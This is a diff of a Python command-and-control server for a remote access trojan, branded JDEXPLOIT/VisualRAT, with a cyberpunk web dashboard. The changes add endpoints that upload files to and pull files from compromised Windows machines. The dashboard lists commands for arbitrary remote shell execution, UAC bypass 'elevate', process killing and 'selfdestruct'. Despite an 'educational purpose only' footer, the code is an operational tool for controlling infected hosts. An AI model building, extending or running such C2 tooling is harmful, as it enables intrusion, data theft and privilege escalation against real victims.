@@ -1,9 +1,7 @@
 #!/usr/bin/env python3
 # ============================================================================
-# VisualRAT C2 v1.0 - RED/BLACK EDITION - By JDEXPLOIT
-# SOLO ENTORNO DE LABORATORIO AUTORIZADO
-# ============================================================================
-# DASHBOARD ÉPICO - ROJO/NEGRO/BLANCO - ESTILO CYBERPUNK
+# JDEXPLOIT C2 v1.0 - RED/BLACK EDITION - COMPLETO
+# Funcionalidades: Shell, Exec, Upload, Download, Elevate, Info, Processes, Dir
 # ============================================================================
 
 import os
@@ -28,11 +26,8 @@ HOST = '0.0.0.0'
 C2_PORT = 4444
 WEB_PORT = 8080
 
-# Colores para terminal - EDICIÓN ROJO/NEGRO
 class Colors:
-    HEADER = '\033[95m'; BLUE = '\033[94m'; CYAN = '\033[96m'
-    GREEN = '\033[92m'; WARNING = '\033[93m'; FAIL = '\033[91m'
-    END = '\033[0m'; BOLD = '\033[1m'; RED = '\033[91m'; WHITE = '\033[97m'; BLACK = '\033[90m'
+    RED = '\033[91m'; WHITE = '\033[97m'; END = '\033[0m'
 
 # ============================================================================
 # CLIENTE (BOT)
@@ -45,9 +40,8 @@ class Client:
         self.hostname = "Unknown"
         self.username = "Unknown"
         self.os = "Windows 11"
-        self.antivirus = "Unknown"
+        self.antivirus = "Defender"
         self.first_seen = datetime.datetime.now()
-        self.last_seen = datetime.datetime.now()
         self.active = True
         self.privilege = "USER"
     
@@ -136,31 +130,53 @@ class C2Core:
         return response if response else "No response"
 
 # ============================================================================
-# SERVIDOR WEB - DASHBOARD RED/BLACK EDITION
+# SERVIDOR WEB - DASHBOARD COMPLETO
 # ============================================================================
 class WebHandler(server.BaseHTTPRequestHandler):
     c2 = None
     
     def do_GET(self):
         path = urlparse(self.path).path
-        if path == '/': self.send_html()
-        elif path == '/api/clients': self.send_clients()
-        elif path.startswith('/api/screenshot/'): 
-            self.send_screenshot(path.split('/')[-1])
-        else: self.send_error(404)
+        if path == '/': 
+            self.send_html()
+        elif path == '/api/clients': 
+            self.send_clients()
+        elif path == '/api/processes':
+            self.send_processes()
+        else: 
+            self.send_error(404)
     
     def do_POST(self):
-        data = json.loads(self.rfile.read(int(self.headers['Content-Length'])).decode())
+        content_length = int(self.headers['Content-Length'])
+        post_data = self.rfile.read(content_length).decode()
+        data = json.loads(post_data)
+        
         if self.path == '/api/command':
             client_id = data.get('client_id')
             command = data.get('command')
             args = data.get('args', '')
             full_cmd = f"{command}|{args}" if args else command
             response = WebHandler.c2.send_command(client_id, full_cmd)
-            self.send_response(200)
-            self.send_header('Content-type', 'application/json')
-            self.end_headers()
-            self.wfile.write(json.dumps({'response': response}).encode())
+            self.send_json({'response': response})
+        
+        elif self.path == '/api/upload':
+            client_id = data.get('client_id')
+            remote_path = data.get('remote_path')
+            file_data = data.get('file_data')
+            response = WebHandler.c2.send_command(client_id, f"UPLOAD|{remote_path}|{file_data}")
+            self.send_json({'response': response})
+        
+        elif self.path == '/api/download':
+            client_id = data.get('client_id')
+            remote_path = data.get('remote_path')
+            response = WebHandler.c2.send_command(client_id, f"DOWNLOAD|{remote_path}")
+            self.send_json({'response': response})
+    
+    def send_json(self, obj):
+        self.send_response(200)
+        self.send_header('Content-type', 'application/json')
+        self.end_headers()
+        self.wfile.write(json.dumps(obj).encode())
     
     def send_html(self):
         self.send_response(200)
@@ -169,34 +185,22 @@ class WebHandler(server.BaseHTTPRequestHandler):
         
         html = """
         <!DOCTYPE html>
-        <html lang="es">
+        <html>
         <head>
             <meta charset="UTF-8">
             <meta name="viewport" content="width=device-width, initial-scale=1.0">
             <title>JDEXPLOIT C2 - RED/BLACK EDITION</title>
             <style>
-                /* ================================================================= */
-                /* DASHBOARD ÉPICO - ROJO/NEGRO/BLANCO - BY JDEXPLOIT                */
-                /* ================================================================= */
-                
-                * {
-                    margin: 0;
-                    padding: 0;
-                    box-sizing: border-box;
-                }
-                
+                * { margin: 0; padding: 0; box-sizing: border-box; }
                 @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap');
                 
                 body {
                     background: #000000;
                     color: #ffffff;
-                    font-family: 'Share Tech Mono', 'Courier New', monospace;
+                    font-family: 'Share Tech Mono', monospace;
                     padding: 30px;
-                    position: relative;
-                    overflow-x: hidden;
                 }
                 
-                /* EFECTO MATRIX ROJO */
                 body::before {
                     content: "";
                     position: fixed;
@@ -204,45 +208,28 @@ class WebHandler(server.BaseHTTPRequestHandler):
                     left: 0;
                     width: 100%;
                     height: 100%;
-                    background: repeating-linear-gradient(
-                        0deg,
-                        rgba(255, 0, 0, 0.03) 0px,
-                        rgba(0, 0, 0, 0.9) 2px,
-                        rgba(255, 0, 0, 0.03) 3px
-                    );
+                    background: repeating-linear-gradient(0deg, rgba(255,0,0,0.03) 0px, rgba(0,0,0,0.9) 2px, rgba(255,0,0,0.03) 3px);
                     pointer-events: none;
-                    z-index: 9999;
                     animation: scan 8s linear infinite;
                 }
                 
-                @keyframes scan {
-                    0% { transform: translateY(0); }
-                    100% { transform: translateY(100%); }
-                }
+                @keyframes scan { 0% { transform: translateY(0); } 100% { transform: translateY(100%); } }
                 
-                .container {
-                    max-width: 1800px;
-                    margin: 0 auto;
-                    position: relative;
-                    z-index: 10000;
-                }
+                .container { max-width: 1800px; margin: 0 auto; position: relative; z-index: 10000; }
                 
-                /* HEADER ÉPICO */
                 .header {
                     background: linear-gradient(135deg, #1a0000 0%, #000000 100%);
                     border: 2px solid #ff0000;
-                    border-radius: 0;
                     padding: 30px;
                     margin-bottom: 30px;
-                    box-shadow: 0 0 30px rgba(255, 0, 0, 0.3);
-                    position: relative;
+                    box-shadow: 0 0 30px rgba(255,0,0,0.3);
                     animation: pulse 2s infinite;
                 }
                 
                 @keyframes pulse {
-                    0% { box-shadow: 0 0 30px rgba(255, 0, 0, 0.3); }
-                    50% { box-shadow: 0 0 50px rgba(255, 0, 0, 0.6); }
-                    100% { box-shadow: 0 0 30px rgba(255, 0, 0, 0.3); }
+                    0% { box-shadow: 0 0 30px rgba(255,0,0,0.3); }
+                    50% { box-shadow: 0 0 50px rgba(255,0,0,0.6); }
+                    100% { box-shadow: 0 0 30px rgba(255,0,0,0.3); }
                 }
                 
                 .header h1 {
@@ -251,17 +238,13 @@ class WebHandler(server.BaseHTTPRequestHandler):
                     font-size: 48px;
                     font-weight: 900;
                     text-transform: uppercase;
-                    margin-bottom: 10px;
-                    text-shadow: 
-                        0 0 20px #ff0000,
-                        0 0 40px #ff0000,
-                        0 0 60px #ff0000;
+                    text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000;
                     letter-spacing: 8px;
                     animation: flicker 3s infinite;
                 }
                 
                 @keyframes flicker {
-                    0%, 100% { opacity: 1; }
+                    0%,100% { opacity: 1; }
                     33% { opacity: 0.9; text-shadow: 0 0 30px #ff0000, 0 0 60px #ff0000; }
                     66% { opacity: 1; text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000; }
                 }
@@ -276,13 +259,12 @@ class WebHandler(server.BaseHTTPRequestHandler):
                     font-size: 16px;
                     letter-spacing: 3px;
                     margin-top: 10px;
-                    border: none;
                     box-shadow: 0 0 20px #ff0000;
                     animation: glitch 2s infinite;
                 }
                 
                 @keyframes glitch {
-                    0%, 100% { transform: skew(0deg, 0deg); }
+                    0%,100% { transform: skew(0deg, 0deg); }
                     95% { transform: skew(5deg, 2deg); }
                     96% { transform: skew(-5deg, -2deg); }
                     97% { transform: skew(3deg, 1deg); }
@@ -301,7 +283,7 @@ class WebHandler(server.BaseHTTPRequestHandler):
                     padding: 25px;
                     position: relative;
                     transition: all 0.3s;
-                    box-shadow: 0 0 15px rgba(255, 0, 0, 0.2);
+                    box-shadow: 0 0 15px rgba(255,0,0,0.2);
                 }
                 
                 .stat-card:hover {
@@ -320,26 +302,10 @@ class WebHandler(server.BaseHTTPRequestHandler):
                     animation: blink 1s infinite;
                 }
                 
-                @keyframes blink {
-                    0%, 100% { opacity: 1; }
-                    50% { opacity: 0; }
-                }
+                @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0; } }
                 
-                .stat-label {
-                    color: #ff9999;
-                    font-size: 14px;
-                    text-transform: uppercase;
-                    letter-spacing: 3px;
-                    margin-bottom: 10px;
-                }
-                
-                .stat-value {
-                    color: #ffffff;
-                    font-size: 42px;
-                    font-weight: bold;
-                    font-family: 'Orbitron', sans-serif;
-                    text-shadow: 0 0 15px #ff0000;
-                }
+                .stat-label { color: #ff9999; font-size: 14px; text-transform: uppercase; letter-spacing: 3px; margin-bottom: 10px; }
+                .stat-value { color: #ffffff; font-size: 42px; font-weight: bold; font-family: 'Orbitron', sans-serif; text-shadow: 0 0 15px #ff0000; }
                 
                 .clients-grid {
                     display: grid;
@@ -352,15 +318,14 @@ class WebHandler(server.BaseHTTPRequestHandler):
                     background: #080000;
                     border: 1px solid #ff3333;
                     padding: 25px;
-                    position: relative;
-                    transition: all 0.3s;
                     border-left: 8px solid #ff0000;
+                    transition: all 0.3s;
                 }
                 
                 .client-card:hover {
                     background: #0c0000;
                     border-color: #ff6666;
-                    box-shadow: 0 0 30px rgba(255, 0, 0, 0.5);
+                    box-shadow: 0 0 30px rgba(255,0,0,0.5);
                     transform: scale(1.02);
                 }
                 
@@ -383,7 +348,6 @@ class WebHandler(server.BaseHTTPRequestHandler):
                     font-family: 'Orbitron', sans-serif;
                     font-weight: bold;
                     letter-spacing: 2px;
-                    font-size: 14px;
                     box-shadow: 0 0 15px #ff0000;
                 }
                 
@@ -419,25 +383,14 @@ class WebHandler(server.BaseHTTPRequestHandler):
                     padding: 12px;
                 }
                 
-                .info-label {
-                    color: #ff6666;
-                    font-size: 10px;
-                    text-transform: uppercase;
-                    letter-spacing: 2px;
-                    margin-bottom: 5px;
-                }
-                
-                .info-value {
-                    color: #ffffff;
-                    font-size: 14px;
-                    font-family: 'Courier New', monospace;
-                    font-weight: bold;
-                }
+                .info-label { color: #ff6666; font-size: 10px; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 5px; }
+                .info-value { color: #ffffff; font-size: 14px; font-family: 'Courier New', monospace; font-weight: bold; }
                 
                 .client-actions {
                     display: flex;
                     gap: 10px;
                     margin-top: 15px;
+                    flex-wrap: wrap;
                 }
                 
                 .btn {
@@ -470,7 +423,7 @@ class WebHandler(server.BaseHTTPRequestHandler):
                     background: #050000;
                     border: 2px solid #ff0000;
                     margin-top: 30px;
-                    box-shadow: 0 0 30px rgba(255, 0, 0, 0.3);
+                    box-shadow: 0 0 30px rgba(255,0,0,0.3);
                 }
                 
                 .terminal-header {
@@ -497,7 +450,6 @@ class WebHandler(server.BaseHTTPRequestHandler):
                     height: 350px;
                     overflow-y: auto;
                     color: #ff9999;
-                    line-height: 1.6;
                 }
                 
                 .terminal-input {
@@ -524,19 +476,16 @@ class WebHandler(server.BaseHTTPRequestHandler):
                     box-shadow: 0 0 15px #ff0000;
                 }
                 
-                .screenshot-viewer {
+                .upload-panel {
                     background: #050000;
-                    border: 2px solid #ff0000;
+                    border: 1px solid #ff0000;
                     padding: 20px;
-                    margin-top: 30px;
-                    text-align: center;
+                    margin-top: 20px;
+                    display: none;
                 }
                 
-                .screenshot-image {
-                    max-width: 100%;
-                    max-height: 500px;
-                    border: 1px solid #ff3333;
-                    box-shadow: 0 0 30px rgba(255, 0, 0, 0.3);
+                .upload-panel.active {
+                    display: block;
                 }
                 
                 .footer {
@@ -558,59 +507,15 @@ class WebHandler(server.BaseHTTPRequestHandler):
                     animation: pulse 2s infinite;
                 }
                 
-                .footer .copy {
-                    color: #ff6666;
-                    font-size: 14px;
-                }
-                
-                /* SCROLLBAR PERSONALIZADO */
-                ::-webkit-scrollbar {
-                    width: 10px;
-                    height: 10px;
-                }
-                
-                ::-webkit-scrollbar-track {
-                    background: #1a0000;
-                }
-                
-                ::-webkit-scrollbar-thumb {
-                    background: #ff0000;
-                    box-shadow: inset 0 0 6px #660000;
-                }
-                
-                ::-webkit-scrollbar-thumb:hover {
-                    background: #ff3333;
-                }
-                
-                /* ANIMACIONES ADICIONALES */
-                .glitch-text {
-                    animation: glitch 3s infinite;
-                }
-                
-                .red-pulse {
-                    animation: pulse 2s infinite;
-                }
-                
-                @media (max-width: 768px) {
-                    .stats { grid-template-columns: 1fr; }
-                    .clients-grid { grid-template-columns: 1fr; }
-                    .header h1 { font-size: 32px; }
-                }
+                .footer .copy { color: #ff6666; font-size: 14px; }
             </style>
         </head>
         <body>
             <div class="container">
-                <!-- HEADER ÉPICO -->
                 <div class="header">
                     <h1>🔴 JDEXPLOIT C2</h1>
-                    <div class="badge">
-                        ⚡ RED/BLACK EDITION v1.0 ⚡
-                    </div>
-                    <p style="color: #ff6666; margin-top: 20px; font-size: 16px; letter-spacing: 3px;">
-                        ────── ████████ RED TEAM FRAMEWORK ████████ ──────
-                    </p>
+                    <div class="badge">⚡ RED/BLACK EDITION v1.0 ⚡</div>
                     
-                    <!-- STATS CARDS -->
                     <div class="stats">
                         <div class="stat-card">
                             <div class="stat-label">Total Clients</div>
@@ -631,38 +536,55 @@ class WebHandler(server.BaseHTTPRequestHandler):
                     </div>
                 </div>
                 
-                <!-- CLIENTS GRID -->
                 <h2 style="color: #ff0000; font-family: 'Orbitron', sans-serif; margin-bottom: 20px; letter-spacing: 4px;">
                     ⚡ CONNECTED CLIENTS ⚡
                 </h2>
                 <div id="clients-container" class="clients-grid"></div>
                 
-                <!-- TERMINAL -->
                 <div class="terminal">
                     <div class="terminal-header">
-                        <span>🔥 JDEXPLOIT REMOTE SHELL 🔥</span>
-                        <span id="current-client-label" style="color: #ff6666;">(none selected)</span>
+                        <div>
+                            <span>🔥 JDEXPLOIT REMOTE SHELL 🔥</span>
+                            <span id="current-client-label" style="color: #ff6666; margin-left: 20px;">(none selected)</span>
+                        </div>
+                        <div>
+                            <button class="btn" onclick="clearTerminal()" style="background: #330000;">
+                                <i class="fas fa-trash"></i> CLEAR
+                            </button>
+                        </div>
                     </div>
                     <div id="terminal-output" class="terminal-content">
                         <span style="color: #ff0000;">[🔥 JDEXPLOIT C2 READY 🔥]</span><br>
                         <span style="color: #ff6666;">[•] Select a client to begin remote control</span><br>
-                        <span style="color: #ff3333;">[•] Commands: shell, exec, screenshot, elevate, info</span><br><br>
+                        <span style="color: #ff9999;">[•] Available commands:</span><br>
+                        <span style="color: #ff9999;">    - shell &#60;cmd&#62;     : Execute any command</span><br>
+                        <span style="color: #ff9999;">    - exec &#60;program&#62;  : Run program (calc, notepad)</span><br>
+                        <span style="color: #ff9999;">    - dir &#60;path&#62;       : List directory</span><br>
+                        <span style="color: #ff9999;">    - download &#60;file&#62;  : Download file</span><br>
+                        <span style="color: #ff9999;">    - upload &#60;file&#62;     : Upload file</span><br>
+                        <span style="color: #ff9999;">    - processes         : List processes</span><br>
+                        <span style="color: #ff9999;">    - kill &#60;pid&#62;       : Kill process</span><br>
+                        <span style="color: #ff9999;">    - info             : System info</span><br>
+                        <span style="color: #ff9999;">    - elevate          : Bypass UAC</span><br>
+                        <span style="color: #ff9999;">    - selfdestruct     : Remove itself</span><br><br>
                     </div>
                     <div class="terminal-input">
-                        <input type="text" id="terminal-cmd" placeholder=">_ enter command..." disabled>
+                        <input type="text" id="terminal-cmd" placeholder=">_ enter command (ej: shell whoami, exec calc.exe, dir C:\\Users, download file.txt, upload)" disabled>
                         <button class="btn" onclick="sendTerminalCommand()" id="terminal-send" disabled>EXECUTE</button>
                     </div>
                 </div>
                 
-                <!-- SCREENSHOT VIEWER -->
-                <div class="screenshot-viewer" id="screenshot-panel" style="display: none;">
-                    <h3 style="color: #ff0000; margin-bottom: 20px; font-family: 'Orbitron', sans-serif;">
-                        📸 LIVE SCREEN CAPTURE
-                    </h3>
-                    <img id="screenshot-img" class="screenshot-image" src="" alt="Screenshot">
+                <div id="upload-modal" class="upload-panel">
+                    <h3 style="color: #ff0000; margin-bottom: 15px;">📤 UPLOAD FILE</h3>
+                    <input type="file" id="upload-file" style="display: none;">
+                    <div style="display: flex; gap: 10px;">
+                        <input type="text" id="upload-remote-path" placeholder="Remote path (ej: C:\\Users\\file.exe)" style="flex: 1; background: #000000; border: 1px solid #ff0000; color: white; padding: 10px;">
+                        <button class="btn" onclick="document.getElementById('upload-file').click()">SELECT FILE</button>
+                        <button class="btn btn-primary" onclick="uploadFile()">UPLOAD</button>
+                        <button class="btn" onclick="closeUploadPanel()">CANCEL</button>
+                    </div>
                 </div>
                 
-                <!-- FOOTER - JDEXPLOIT -->
                 <div class="footer">
                     <div class="autor">🔴 JDEXPLOIT 🔴</div>
                     <div class="copy">██████ RED TEAM OPERATOR ██████</div>
@@ -670,19 +592,16 @@ class WebHandler(server.BaseHTTPRequestHandler):
                         ⚡ SOLO ENTORNOS AUTORIZADOS • EDUCATIONAL PURPOSE ONLY ⚡
                     </div>
                     <div style="color: #660000; margin-top: 20px; letter-spacing: 2px;">
-                        ───━═══ RED/BLACK EDITION v1.0 ═══━───
+                        ───━═══ FULLY FUNCTIONAL C2 v1.0 ═══━───
                     </div>
                 </div>
             </div>
             
             <script src="https://kit.fontawesome.com/8d4a5b8c5b.js" crossorigin="anonymous"></script>
             <script>
-                // =================================================================
-                // JDEXPLOIT C2 - RED/BLACK EDITION
-                // =================================================================
-                
                 let currentClientId = null;
                 let clients = {};
+                let selectedFile = null;
                 
                 setInterval(loadClients, 2000);
                 setInterval(updateStats, 2000);
@@ -741,14 +660,20 @@ class WebHandler(server.BaseHTTPRequestHandler):
                                 <button class="btn" onclick="selectClient('${client.id}')">
                                     <i class="fas fa-terminal"></i> SHELL
                                 </button>
-                                <button class="btn" onclick="takeScreenshot('${client.id}')">
-                                    <i class="fas fa-camera"></i> SCREEN
+                                <button class="btn" onclick="showUploadPanel('${client.id}')">
+                                    <i class="fas fa-upload"></i> UPLOAD
+                                </button>
+                                <button class="btn" onclick="promptDownload('${client.id}')">
+                                    <i class="fas fa-download"></i> DOWNLOAD
                                 </button>
                                 <button class="btn" onclick="elevateClient('${client.id}')">
                                     <i class="fas fa-shield-alt"></i> ELEVATE
                                 </button>
-                                <button class="btn" onclick="openFileManager('${client.id}')">
-                                    <i class="fas fa-folder"></i> FILES
+                                <button class="btn" onclick="getInfo('${client.id}')">
+                                    <i class="fas fa-info-circle"></i> INFO
+                                </button>
+                                <button class="btn" onclick="getProcesses('${client.id}')">
+                                    <i class="fas fa-tasks"></i> PROCESSES
                                 </button>
                             </div>
                         `;
@@ -758,7 +683,6 @@ class WebHandler(server.BaseHTTPRequestHandler):
                 
                 function selectClient(clientId) {
                     currentClientId = clientId;
-                    
                     if (clients[clientId]) {
                         document.getElementById('current-client-label').innerHTML = 
                             '(' + clients[clientId].hostname + ' - ' + clientId + ')';
@@ -766,7 +690,6 @@ class WebHandler(server.BaseHTTPRequestHandler):
                         addToTerminal('[•] OS: ' + clients[clientId].os + ' | User: ' + clients[clientId].username + 
                                    ' | Priv: ' + clients[clientId].privilege, '#ff6666');
                     }
-                    
                     document.getElementById('terminal-cmd').disabled = false;
                     document.getElementById('terminal-send').disabled = false;
                 }
@@ -778,13 +701,16 @@ class WebHandler(server.BaseHTTPRequestHandler):
                     addToTerminal('> ' + cmd, '#ff9999');
                     document.getElementById('terminal-cmd').value = '';
                     
+                    let command = cmd.split(' ')[0];
+                    let args = cmd.substring(cmd.indexOf(' ') + 1);
+                    
                     fetch('/api/command', {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({
                             client_id: currentClientId,
-                            command: cmd.split(' ')[0],
-                            args: cmd.substring(cmd.indexOf(' ') + 1)
+                            command: command,
+                            args: args
                         })
                     })
                     .then(r => r.json())
@@ -793,14 +719,77 @@ class WebHandler(server.BaseHTTPRequestHandler):
                     });
                 }
                 
-                function takeScreenshot(clientId) {
-                    document.getElementById('screenshot-panel').style.display = 'block';
-                    document.getElementById('screenshot-img').src = '/api/screenshot/' + clientId + '?t=' + Date.now();
+                function showUploadPanel(clientId) {
+                    currentClientId = clientId;
+                    document.getElementById('upload-modal').classList.add('active');
+                }
+                
+                function closeUploadPanel() {
+                    document.getElementById('upload-modal').classList.remove('active');
+                }
+                
+                document.getElementById('upload-file').addEventListener('change', function(e) {
+                    selectedFile = e.target.files[0];
+                    if (selectedFile) {
+                        document.getElementById('upload-remote-path').value = 'C:\\Users\\' + selectedFile.name;
+                    }
+                });
+                
+                function uploadFile() {
+                    if (!currentClientId || !selectedFile) {
+                        addToTerminal('[-] No file selected', '#ff4d4d');
+                        return;
+                    }
+                    
+                    const remotePath = document.getElementById('upload-remote-path').value;
+                    if (!remotePath) {
+                        addToTerminal('[-] No remote path specified', '#ff4d4d');
+                        return;
+                    }
+                    
+                    const reader = new FileReader();
+                    reader.onload = function(e) {
+                        const fileData = btoa(e.target.result);
+                        
+                        fetch('/api/upload', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({
+                                client_id: currentClientId,
+                                remote_path: remotePath,
+                                file_data: fileData
+                            })
+                        })
+                        .then(r => r.json())
+                        .then(data => {
+                            addToTerminal(data.response, '#cccccc');
+                            closeUploadPanel();
+                            selectedFile = null;
+                        });
+                    };
+                    reader.readAsBinaryString(selectedFile);
+                }
+                
+                function promptDownload(clientId) {
+                    const remotePath = prompt('Enter remote file path:', 'C:\\Users\\file.txt');
+                    if (remotePath) {
+                        fetch('/api/download', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({
+                                client_id: clientId,
+                                remote_path: remotePath
+                            })
+                        })
+                        .then(r => r.json())
+                        .then(data => {
+                            addToTerminal(data.response, '#cccccc');
+                        });
+                    }
                 }
                 
                 function elevateClient(clientId) {
                     addToTerminal('[⚠️] Attempting privilege escalation...', '#ffaa00');
-                    
                     fetch('/api/command', {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
@@ -816,23 +805,36 @@ class WebHandler(server.BaseHTTPRequestHandler):
                     });
                 }
                 
-                function openFileManager(clientId) {
-                    const path = prompt('Remote path:', 'C:\\Users');
-                    if (path) {
-                        fetch('/api/command', {
-                            method: 'POST',
-                            headers: {'Content-Type': 'application/json'},
-                            body: JSON.stringify({
-                                client_id: clientId,
-                                command: 'DIR',
-                                args: path
-                            })
+                function getInfo(clientId) {
+                    fetch('/api/command', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            client_id: clientId,
+                            command: 'INFO_FULL',
+                            args: ''
                         })
-                        .then(r => r.json())
-                        .then(data => {
-                            addToTerminal('[DIR] ' + path + '\\n' + data.response, '#cccccc');
-                        });
-                    }
+                    })
+                    .then(r => r.json())
+                    .then(data => {
+                        addToTerminal(data.response, '#cccccc');
+                    });
+                }
+                
+                function getProcesses(clientId) {
+                    fetch('/api/command', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            client_id: clientId,
+                            command: 'PROCESSES',
+                            args: ''
+                        })
+                    })
+                    .then(r => r.json())
+                    .then(data => {
+                        addToTerminal(data.response, '#cccccc');
+                    });
                 }
                 
                 function addToTerminal(text, color = '#ff9999') {
@@ -852,7 +854,7 @@ class WebHandler(server.BaseHTTPRequestHandler):
                     const output = document.getElementById('terminal-output');
                     output.innerHTML = '<span style="color: #ff0000;">[🔥 JDEXPLOIT C2 READY 🔥]</span><br>' +
                                      '<span style="color: #ff6666;">[•] Select a client to begin remote control</span><br>' +
-                                     '<span style="color: #ff3333;">[•] Commands: shell, exec, screenshot, elevate, info</span><br><br>';
+                                     '<span style="color: #ff9999;">[•] Commands: shell, exec, dir, download, upload, processes, kill, info, elevate, selfdestruct</span><br><br>';
                 }
                 
                 function updateStats() {
@@ -883,20 +885,14 @@ class WebHandler(server.BaseHTTPRequestHandler):
         self.wfile.write(html.encode())
     
     def send_clients(self):
-        self.send_response(200)
-        self.send_header('Content-type', 'application/json')
-        self.end_headers()
-        clients_list = [client.to_dict() for client in WebHandler.c2.clients.values()]
-        self.wfile.write(json.dumps(clients_list).encode())
+        self.send_json([client.to_dict() for client in WebHandler.c2.clients.values()])
     
-    def send_screenshot(self, client_id):
-        self.send_response(200)
-        self.send_header('Content-type', 'image/png')
-        self.end_headers()
-        if client_id in WebHandler.c2.clients:
-            response = WebHandler.c2.send_command(client_id, "SCREENSHOT")
-            if response and not response.startswith("[-]"):
-                self.wfile.write(base64.b64decode(response))
+    def send_processes(self):
+        if WebHandler.c2.current_client:
+            response = WebHandler.c2.send_command(WebHandler.c2.current_client.id, "PROCESSES")
+            self.send_json({'processes': response})
+        else:
+            self.send_json({'processes': 'No client selected'})
     
     def log_message(self, format, *args):
         pass
@@ -905,7 +901,7 @@ class ThreadedHTTPServer(ThreadingMixIn, server.HTTPServer):
     pass
 
 # ============================================================================
-# MAIN - JDEXPLOIT
+# MAIN
 # ============================================================================
 def main():
     print(f"""
@@ -921,9 +917,9 @@ def main():
     
 {Colors.RED}[🔥]{Colors.END} C2 Core:     {Colors.WHITE}{HOST}:{C2_PORT}{Colors.END}
 {Colors.RED}[🔥]{Colors.END} Web UI:      {Colors.WHITE}http://{HOST}:{WEB_PORT}{Colors.END}
-{Colors.RED}[🔥]{Colors.END} Platform:    {Colors.WHITE}Windows 11 Client / Kali Server{Colors.END}
 {Colors.RED}[🔥]{Colors.END} Author:      {Colors.WHITE}JDEXPLOIT{Colors.END}
 {Colors.RED}[🔥]{Colors.END} Status:      {Colors.RED}ACTIVE{Colors.END}
+{Colors.RED}[🔥]{Colors.END} Features:    {Colors.WHITE}SHELL • EXEC • UPLOAD • DOWNLOAD • ELEVATE • PROCESSES • KILL • INFO{Colors.END}
     """)
     
     c2 = C2Core()
@@ -932,7 +928,6 @@ def main():
     WebHandler.c2 = c2
     web_server = ThreadedHTTPServer((HOST, WEB_PORT), WebHandler)
     print(f"{Colors.RED}[🔥]{Colors.END} Web dashboard: {Colors.WHITE}http://{HOST}:{WEB_PORT}{Colors.END}")
-    print(f"{Colors.RED}[🔥]{Colors.END} {Colors.WHITE}Press Ctrl+C to stop{Colors.END}")
     
     try:
         web_server.serve_forever()
